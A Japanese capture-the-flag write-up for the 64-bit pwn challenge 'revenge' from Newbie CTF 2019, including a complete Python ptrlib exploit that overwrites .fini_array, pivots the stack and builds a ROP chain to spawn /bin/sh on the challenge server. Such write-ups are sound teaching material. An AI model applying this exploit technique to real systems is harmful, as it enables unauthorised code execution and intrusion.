# [pwn 1000pts] revenge - Newbie CTF 2019
64ビットでstatically linkedで、canaryとDEPが有効です。
```
$ checksec -f revenge
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No      0               0       revenge
```
任意のアドレスに0x19バイト書き込めます。PIEが無効なのでexit系の処理を書き換える問題ですね。
mainが終了する前にcanaryの2バイト目を書き換えたアドレスの最下位バイトで書き換えています。
```
canary[1] = address & 0xff;
```
基本的にクラッシュしちゃうのですが、とりあえず256回くらい試せば1回くらいは落ちないので無視します。

とりあえずセオリー通りに`.fini_array`を書き換えましょう。`__libc_csu_fini`ではrbpに`.fini_array`を入れてcallするので、呼び出し先をleave retに変えればrspを`.fini_array + 8`に変更でき、ROPに持ち込めます。
また、`.fini_array[0]`を`__libc_csu_fini`, `.fini_array[1]`を`main`にすれば何度でも書き換えできます。
といっても問題があり、canaryをbypassしないとダメなので書き換えられるアドレスが限られています。`.fini_array`は0x6d1150にあるので、下位1バイトが0x50であるようなアドレスしか書き換えられません。したがって、ROP chainは0x10バイトまでしか書き込めず、もちろんこれだけでは何もできません。

そこで、retn gadgetを使います。いい感じのものを探したところ、`retn 0x3e8;`がありました。これで0x400バイト先のgadgetを実行できます。
retn gadgetはrspを移してからretするのではなく、retしてからrspを移すのでretnの次のgadgetを用意しないといけないことに注意してROP chainを作ります。
```python
from ptrlib import *
import time

rop_leave_ret = 0x400cc3
rop_retn_3e8 = 0x00463567
rop_ret = 0x0040042e
rop_pop_rax = 0x00415764
rop_pop_rdx = 0x0044bee6
rop_pop_rsi = 0x004103b3
rop_pop_rdi = 0x004006f6
rop_syscall = 0x0040133c

addr_fini = 0x401a40
addr_fini_array = 0x6d1150
addr_main = 0x400c00
addr_stack = 0x6d1160
addr_binsh = 0x6d1250

def overwrite(addr, data):
    assert addr & 0xff == 0x50
    sock.sendline(str(addr))
    sock.send(data)
    sock.recvline()
    return

while True:
    #sock = Process("./revenge")
    sock = Socket("prob.vulnerable.kr", 20037)

    overwrite(addr_fini_array, p64(addr_fini) + p64(addr_main))
    if b'***' in sock.recvline(timeout=0.5):
        sock.close()
        continue

    logger.info("OK. sending payload...")
    overwrite(addr_binsh,
              b"/bin/sh\x00")
    overwrite(addr_fini_array + 0x400 * 4,
              p64(addr_binsh) + p64(rop_retn_3e8) + p64(rop_syscall))
    overwrite(addr_fini_array + 0x400 * 3,
              p64(0) + p64(rop_retn_3e8) + p64(rop_pop_rdi))
    overwrite(addr_fini_array + 0x400 * 2,
              p64(0) + p64(rop_retn_3e8) + p64(rop_pop_rdx))
    overwrite(addr_fini_array + 0x400,
              p64(0x3b) + p64(rop_retn_3e8) + p64(rop_pop_rsi))
    overwrite(addr_fini_array,
              p64(rop_leave_ret) + p64(rop_retn_3e8) + p64(rop_pop_rax))
    sock.interactive()
    exit(0)
```

# 感想
面白かったです。
